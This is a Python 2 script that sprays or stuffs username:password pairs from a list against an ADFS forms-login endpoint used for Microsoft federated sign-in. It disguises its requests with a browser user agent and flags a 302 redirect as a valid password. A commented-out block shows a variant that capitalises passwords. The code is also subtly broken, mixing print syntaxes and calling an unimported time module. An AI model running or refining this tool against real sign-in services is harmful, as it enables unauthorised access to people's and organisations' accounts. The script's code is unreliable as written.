from __future__ import print_function
import urllib2
import urllib
import sys

def send_request(url, username, password):
        print("Trying '%s:%s'" % (username,password))

        request = urllib2.Request("%s/adfs/ls/?client-request-id=&wa=wsignin1.0&wtrealm=%s&wctx=cbcxt=&username=%s&mkt=&lc=" % (url, urllib.quote("urn:federation:MicrosoftOnline"), urllib.quote(username)))
        request.add_header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36")
        request.add_header("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")
        try:
                response = urllib2.urlopen(request, "UserName=%s&Password=%s&AuthMethod=FormsAuthentication" % (urllib.quote(username), urllib.quote(password)))
                if response.code == 302:
                        print "\t[!] %s password is %s" % (username, password)
                #print response.read()
        except:
                pass

if __name__ == "__main__":
        
        if len(sys.argv) < 3:
                print("Usage {} url username-password-list".format(sys.argv[0]))
                exit(0)
  
# update first char of passwords to upper
#         if sys.argv[1] == "updatelist":
#                 with open(sys.argv[2], "r") as f:
#                      lines = f.readlines()

#                 for line in lines:
#                     user = line.split(":")[0]
#                     pwd = line.split(":")[1]

#                     if pwd[0].islower():
#                         pwd = pwd[0].upper()+pwd[1:len(pwd)]
#                     print("{}:{}".format(user,pwd))

        for line in open(sys.argv[2], "rb").readlines():
            if line.startswith("#"):
                continue
            username = line.split(":")[0]
            password = line.split(":")[1].strip()
            send_request(sys.argv[1], username, password)
            time.sleep(2)
